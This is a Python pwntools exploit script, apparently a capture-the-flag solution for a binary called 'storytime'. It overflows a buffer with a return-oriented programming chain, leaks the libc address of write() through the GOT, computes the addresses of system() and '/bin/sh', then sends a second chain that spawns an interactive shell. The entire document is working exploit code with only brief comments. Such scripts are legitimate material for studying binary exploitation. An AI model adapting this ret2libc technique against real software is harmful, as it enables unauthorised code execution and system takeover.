from pwn import *
import time

######## TOYS #########
pop_rdi = p64(0x0000000000400703) # pop rdi; ret; 
pop_rsi = p64(0x0000000000400701) # pop rsi; pop r15; ret;
got_write = p64(0x00601018)
write = p64(0x00400606)
main = p64(0x0040062e)
junk = b'\x41' * 56
filler = b'\x42' * 8
ret = p64(0x000000000040048e)

binsh_offset = 0x1B3E9A
write_offset = 0x110140
system_offset = 0x4F440
#######################

pwn = process("./storytime")
#pwn = gdb.debug("./storytime",'''
#b *main
#c
#''')

buf = junk
buf += pop_rdi
buf += p64(0x1)
buf += pop_rsi
buf += got_write
buf += filler # gets popped into r15
buf += write
buf += filler # gets popped into rbp when we ret from write()
buf += main # loop back around to main 


pwn.send(buf)
pwn.recvuntil("Tell me a story:")
write_addr = pwn.recv(8)
write_addr = write_addr[2:]
write_addr = u64(write_addr + (b'\x00' * 2))
print("[>] Write address: {}".format(hex(write_addr)))
libc_base = write_addr - write_offset
print("[>] libc base: {}".format(hex(libc_base)))
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
print("[>] System address: {}".format(hex(system_addr)))
print("[>] /bin/sh address: {}".format(hex(binsh_addr)))

buf2 = junk
buf2 += pop_rdi
buf2 += p64(binsh_addr)
buf2 += ret # needed for stack alignment on ubuntu 18.04
buf2 += p64(system_addr)

pwn.send(buf2)

pwn.interactive()
